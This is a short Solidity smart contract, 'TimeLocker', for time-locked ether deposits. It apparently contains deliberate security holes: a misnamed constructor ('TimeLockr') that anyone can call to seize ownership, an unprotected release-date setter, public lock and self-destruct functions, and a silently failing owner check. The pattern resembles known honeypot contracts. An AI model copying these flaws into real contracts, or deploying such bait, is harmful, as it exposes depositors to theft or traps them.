pragma solidity ^0.4.15;

contract TimeLocker {
    
    event Deposit(address indexed depositor, uint amount);
    event Withdrawal(address indexed to, uint amount);

    address Owner;
    function transferOwnership(address to) public onlyOwner {
        Owner = to;
    }
    
    mapping (address => uint) public Deposits;
    uint minDeposit;
    bool Locked;
    uint Date;

    function TimeLockr() payable open {
        Owner = msg.sender;
        minDeposit = 0.5 ether;
        Locked = false;
        deposit();
    }

    function SetReleaseDate(uint NewDate) {
        Date = NewDate;
    }

    function() public payable { deposit(); }

    function deposit() public payable {
        if (msg.value > 0) {
            if (msg.value >= MinimumDeposit())
                Deposits[msg.sender] += msg.value;
            Deposit(msg.sender, msg.value);
        }
    }

    function withdraw(uint amount) public { withdrawTo(msg.sender, amount); }
    
    function withdrawTo(address to, uint amount) public onlyOwner {
        if (WithdrawalEnabled()) {
            uint max = Deposits[msg.sender];
            if (max > 0 && amount <= max) {
                to.transfer(amount);
                Withdrawal(to, amount);
            }
        }
    }

    function MinimumDeposit() public constant returns (uint) { return minDeposit; }
    function ReleaseDate() public constant returns (uint) { return Date; }
    function WithdrawalEnabled() constant internal returns (bool) { return Date > 0 && Date <= now; }
    function lock() public { Locked = true; }
    modifier onlyOwner { if (msg.sender == Owner) _; }
    modifier open { if (!Locked) _; }
    function kill() { require(this.balance == 0); selfdestruct(Owner); }
}